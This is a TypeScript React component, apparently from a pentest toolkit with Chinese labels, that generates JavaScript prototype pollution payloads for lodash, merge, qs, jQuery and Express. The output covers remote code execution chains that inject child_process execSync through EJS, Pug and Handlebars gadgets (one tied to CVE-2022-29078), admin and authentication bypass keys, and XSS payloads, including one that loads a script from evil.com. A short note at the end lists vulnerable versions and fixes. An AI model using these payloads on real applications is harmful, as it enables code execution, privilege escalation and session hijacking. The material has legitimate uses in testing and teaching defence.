import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * Prototype Pollution Payload Generator
 * Generates payloads for various JS libraries and attack targets.
 * ========================================================== */

const generatePayload = (lib: string, target: string): string => {
  const lines: string[] = [];
  lines.push(`── 原型链污染 Payload (${lib} → ${target}) ──`);
  lines.push('');

  // Base pollution payloads by library
  const payloads: Record<string, string[]> = {
    lodash: [
      '{"__proto__":{"polluted":"yes"}}',
      '{"constructor":{"prototype":{"polluted":"yes"}}}',
      JSON.stringify({ __proto__: { isAdmin: true } }),
    ],
    merge: [
      '{"__proto__":{"polluted":"yes"}}',
      '{"constructor":{"prototype":{"polluted":"yes"}}}',
    ],
    qs: [
      '__proto__[polluted]=yes',
      '__proto__.polluted=yes',
      'constructor[prototype][polluted]=yes',
    ],
    jquery: [
      '?__proto__[polluted]=yes',
      '?constructor[prototype][polluted]=yes',
    ],
    express: [
      '{"__proto__":{"polluted":"yes"}}',
      // Express body-parser / qs parsing
      'body=__proto__[polluted]=yes',
    ],
  };

  lines.push(' ▸ 基础污染 payload:');
  for (const p of payloads[lib] ?? payloads.lodash) {
    lines.push(`   ${p}`);
  }
  lines.push('');

  if (target === 'rce') {
    lines.push(' ▸ RCE 利用链:');
    lines.push('');
    lines.push('   # 1. child_process (Node.js):');
    lines.push('   {"__proto__":{"shell":"node","env":{"EVIL":"require(\'child_process\').execSync(\'id\')"},"NODE_OPTIONS":"--require /proc/self/environ"}}');
    lines.push('');
    lines.push('   # 2. EJS 模板注入:');
    lines.push('   {"__proto__":{"outputFunctionName":"x;global.process.mainModule.require(\'child_process\').execSync(\'id\');//"}}');
    lines.push('');
    lines.push('   # 3. Pug 模板注入:');
    lines.push('   {"__proto__":{"block":{"type":"Text","line":"global.process.mainModule.require(\'child_process\').execSync(\'id\')"}}}');
    lines.push('');
    lines.push('   # 4. Handlebars 模板注入:');
    lines.push('   {"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":0,"params":[{"type":"NumberLiteral","value":0}],"hash":0,"escaped":false,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":0}}}]},"strip":{},"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":0}},"__proto__":{"type":"program","body":[{"type":"MustacheStatement","path":0,"params":[{"type":"StringLiteral","value":"require(\\\'child_process\\\').execSync(\\\'id\\\')"}],"hash":0,"escaped":false}]},"strip":{}}}');
    lines.push('');
    lines.push('   # 5. EJS (CVE-2022-29078):');
    lines.push('   {"__proto__":{"client":true,"escape":"1;return global.process.mainModule.require(\'child_process\').execSync(\'id\');//"}}');
    lines.push('');
  }

  if (target === 'logic-bypass') {
    lines.push(' ▸ 逻辑绕过利用:');
    lines.push('');
    lines.push('   # 1. 绕过权限检查:');
    lines.push('   {"__proto__":{"isAdmin":true}}');
    lines.push('   {"__proto__":{"role":"admin"}}');
    lines.push('   {"__proto__":{"authenticated":true}}');
    lines.push('');
    lines.push('   # 2. 绕过类型检查:');
    lines.push('   {"__proto__":{"type":"admin"}}');
    lines.push('   {"__proto__":{"verified":true}}');
    lines.push('');
    lines.push('   # 3. 修改默认配置:');
    lines.push('   {"__proto__":{"debug":true}}');
    lines.push('   {"__proto__":{"limit":999999}}');
    lines.push('');
    lines.push('   # 4. 绕过数组 includes 检查:');
    lines.push('   # 若代码使用 [].includes(value) 检查白名单:');
    lines.push('   {"__proto__":{"0":"evil_value"}}');
    lines.push('   # 此时 [].includes("evil_value") 返回 true');
    lines.push('');
  }

  if (target === 'xss') {
    lines.push(' ▸ XSS 利用链:');
    lines.push('');
    lines.push('   # 1. jQuery $.extend 污染:');
    lines.push('   ?__proto__[src]=//evil.com/xss.js');
    lines.push('   # 若页面动态加载脚本读取 obj.src');
    lines.push('');
    lines.push('   # 2. 污染 innerHTML:');
    lines.push('   {"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}');
    lines.push('');
    lines.push('   # 3. 污染 srcdoc:');
    lines.push('   {"__proto__":{"srcdoc":"<script>alert(1)</script>"}}');
    lines.push('');
    lines.push('   # 4. 污染模板变量:');
    lines.push('   {"__proto__":{"title":"<img src=x onerror=alert(1)>"}}');
    lines.push('');
    lines.push('   # 5. DOM Clobbering 配合:');
    lines.push('   {"__proto__":{"id":"x"}}');
    lines.push('   # 配合 <form id=x> 可劫持 window.x');
    lines.push('');
  }

  lines.push(' 说明:');
  lines.push('  - __proto__ 是所有对象的原型, 污染后影响所有继承该原型的对象');
  lines.push('  - constructor.prototype 是另一种访问原型的方式');
  lines.push('  - lodash <4.17.12 的 merge/defaultsDeep 存在原型链污染');
  lines.push('  - qs <6.3.1 默认允许 __proto__ 键名');
  lines.push('  - jQuery $.extend(true, {}, userInput) 深拷贝可触发污染');
  lines.push('  - Express 的 body-parser 在 JSON 解析时可能引入污染');
  lines.push('  - 修复: Object.create(null) / Map 代替普通对象 / 过滤 __proto__ 和 constructor');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="原型链污染Payload"
    paramsConfig={[
      {
        name: 'lib',
        label: '库',
        type: 'select',
        default: 'lodash',
        options: [
          { value: 'lodash', label: 'lodash' },
          { value: 'merge', label: 'merge' },
          { value: 'qs', label: 'qs' },
          { value: 'jquery', label: 'jQuery' },
          { value: 'express', label: 'Express' },
        ],
      },
      {
        name: 'target',
        label: '目标',
        type: 'select',
        default: 'rce',
        options: [
          { value: 'rce', label: 'RCE' },
          { value: 'logic-bypass', label: '逻辑绕过' },
          { value: 'xss', label: 'XSS' },
        ],
      },
    ]}
    execute={(_input: string, _mode: string, params: Record<string, unknown>): string => {
      const lib = (params.lib as string) ?? 'lodash';
      const target = (params.target as string) ?? 'rce';
      return generatePayload(lib, target);
    }}
  />
);
export default ToolComponent;
